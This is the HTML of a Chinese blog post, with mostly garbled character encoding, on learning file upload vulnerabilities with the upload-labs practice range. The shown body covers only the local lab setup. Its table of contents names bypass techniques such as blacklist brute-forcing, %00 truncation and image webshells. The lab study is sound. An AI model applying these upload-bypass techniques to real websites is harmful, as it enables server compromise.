<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>æ–‡ä»¶ä¸Šä¼ æ¼æ´â€”â€”upload-labsé¶åœºå­¦ä¹  | m0reçš„å°ç«™</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"äººç”Ÿè·¯æ¼«æ¼«","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="å‰è¨€ï¼šä¹‹å‰åœ¨DVWAé¶åœºä¸Šäº†è§£äº†uploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¹¶è¿›è¡Œäº†å­¦ä¹ ï¼Œç°åœ¨æ¥å®‰è£…upload-labsæ¥æ‰“ä¸€ä¸‹é¶åœºã€‚ æ­å»ºé¶åœºphpstudyé›†æˆç¯å¢ƒã€‚upload-labsé¡¹ç›®åœ°å€upload-labsï¼Œä¸‹è½½å‹ç¼©åŒ…è§£å‹åˆ°æœ¬åœ°phpstudyçš„wwwæ–‡ä»¶å¤¹ä¸‹ï¼Œå°†æ–‡ä»¶å¤¹å‘½åä¸ºupload-labs(ä¸ªäººé€‰æ‹©)ï¼Œä¹Ÿå¯ä»¥ä¸æ”¹ã€‚æ‰“å¼€phpstudyï¼Œå¼€å¯ç¯å¢ƒåœ¨æµè§ˆå™¨ä¸­è®¿é—®127.0.0.1&#x2F;upload">
<meta property="og:type" content="article">
<meta property="og:title" content="æ–‡ä»¶ä¸Šä¼ æ¼æ´â€”â€”upload-labsé¶åœºå­¦ä¹ ">
<meta property="og:url" content="https://m0re.top/posts/1158347a/index.html">
<meta property="og:site_name" content="m0reçš„å°ç«™">
<meta property="og:description" content="å‰è¨€ï¼šä¹‹å‰åœ¨DVWAé¶åœºä¸Šäº†è§£äº†uploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¹¶è¿›è¡Œäº†å­¦ä¹ ï¼Œç°åœ¨æ¥å®‰è£…upload-labsæ¥æ‰“ä¸€ä¸‹é¶åœºã€‚ æ­å»ºé¶åœºphpstudyé›†æˆç¯å¢ƒã€‚upload-labsé¡¹ç›®åœ°å€upload-labsï¼Œä¸‹è½½å‹ç¼©åŒ…è§£å‹åˆ°æœ¬åœ°phpstudyçš„wwwæ–‡ä»¶å¤¹ä¸‹ï¼Œå°†æ–‡ä»¶å¤¹å‘½åä¸ºupload-labs(ä¸ªäººé€‰æ‹©)ï¼Œä¹Ÿå¯ä»¥ä¸æ”¹ã€‚æ‰“å¼€phpstudyï¼Œå¼€å¯ç¯å¢ƒåœ¨æµè§ˆå™¨ä¸­è®¿é—®127.0.0.1&#x2F;upload">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200426124534142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200426132330859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200426141548939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200509224024679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020050922414186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200509224249905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200509224434638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200509224620148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200509224829441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200509225054720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020050922522639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020050922561114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/202005111627009.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511163223684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511163503549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511170305633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511170350369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511170652283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511171014758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511171142217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511171524604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511171328208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511171753880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511171839344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511174326316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511175244701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020051117533873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511182305466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511182409426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020051118260279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200511182855402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512090543515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512093100951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512093153787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020051209391194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512094009859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512095949200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512101250421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512101819686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512102044331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512102547291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512105346939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200512105528292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="article:published_time" content="2020-08-23T08:31:57.553Z">
<meta property="article:modified_time" content="2020-09-01T07:51:18.743Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200426124534142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="ç©·é¬¼å•Šå•Šå•Šå•Š">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0reçš„å°ç«™</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">121</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">20</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">52</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">æ­å»ºé¶åœº</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E9%97%AF%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">å¼€å§‹é—¯å…³</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-01"><span class="toc-number">2.1.</span> <span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-02"><span class="toc-number">2.2.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-03%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">Pass-03é»‘åå•éªŒè¯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">æ™®é€šæ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8burpsuite%E7%88%86%E7%A0%B4%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.3.2.</span> <span class="toc-text">ä½¿ç”¨burpsuiteçˆ†ç ´é»‘åå•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-04"><span class="toc-number">2.4.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-05"><span class="toc-number">2.5.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-06"><span class="toc-number">2.6.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-07"><span class="toc-number">2.7.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-08"><span class="toc-number">2.8.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-09"><span class="toc-number">2.9.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-10"><span class="toc-number">2.10.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-11"><span class="toc-number">2.11.</span> <span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-12-00%E6%88%AA%E6%96%ADGet"><span class="toc-number">2.12.</span> <span class="toc-text">Pass-12 %00æˆªæ–­Get</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-13-00%E6%88%AA%E6%96%ADPOST"><span class="toc-number">2.13.</span> <span class="toc-text">Pass-13 00æˆªæ–­POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-14%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">2.14.</span> <span class="toc-text">Pass-14å›¾ç‰‡é©¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-15"><span class="toc-number">2.15.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16"><span class="toc-number">2.16.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-17%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">2.17.</span> <span class="toc-text">Pass-17äºŒæ¬¡æ¸²æŸ“</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/1158347a/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0reçš„å°ç«™"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">æ–‡ä»¶ä¸Šä¼ æ¼æ´â€”â€”upload-labsé¶åœºå­¦ä¹ </h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">å‘è¡¨äº</span> <time title="åˆ›å»ºæ—¶é—´ï¼š2020-08-23 16:31:57" itemprop="dateCreated datePublished" datetime="2020-08-23T16:31:57+08:00">2020-08-23</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">æ›´æ–°äº</span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-09-01 15:51:18" itemprop="dateModified" datetime="2020-09-01T15:51:18+08:00">2020-09-01</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/1158347a/" data-flag-title="æ–‡ä»¶ä¸Šä¼ æ¼æ´â€”â€”upload-labsé¶åœºå­¦ä¹ "><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-tag"><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p>å‰è¨€ï¼šä¹‹å‰åœ¨DVWAé¶åœºä¸Šäº†è§£äº†uploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¹¶è¿›è¡Œäº†å­¦ä¹ ï¼Œç°åœ¨æ¥å®‰è£…upload-labsæ¥æ‰“ä¸€ä¸‹é¶åœºã€‚</p>
<h1 id="æ­å»ºé¶åœº"><a href="#æ­å»ºé¶åœº" class="headerlink" title="æ­å»ºé¶åœº"></a>æ­å»ºé¶åœº</h1><p>phpstudyé›†æˆç¯å¢ƒã€‚<br>upload-labsé¡¹ç›®åœ°å€<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a>ï¼Œä¸‹è½½å‹ç¼©åŒ…è§£å‹åˆ°æœ¬åœ°phpstudyçš„wwwæ–‡ä»¶å¤¹ä¸‹ï¼Œå°†æ–‡ä»¶å¤¹å‘½åä¸º<code>upload-labs</code>(ä¸ªäººé€‰æ‹©)ï¼Œä¹Ÿå¯ä»¥ä¸æ”¹ã€‚<br>æ‰“å¼€phpstudyï¼Œå¼€å¯ç¯å¢ƒåœ¨æµè§ˆå™¨ä¸­è®¿é—®<code>127.0.0.1/upload-labs</code>å°±å¯ä»¥è¿›å…¥é¶åœºã€‚<br><img src="https://img-blog.csdnimg.cn/20200426124534142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p>
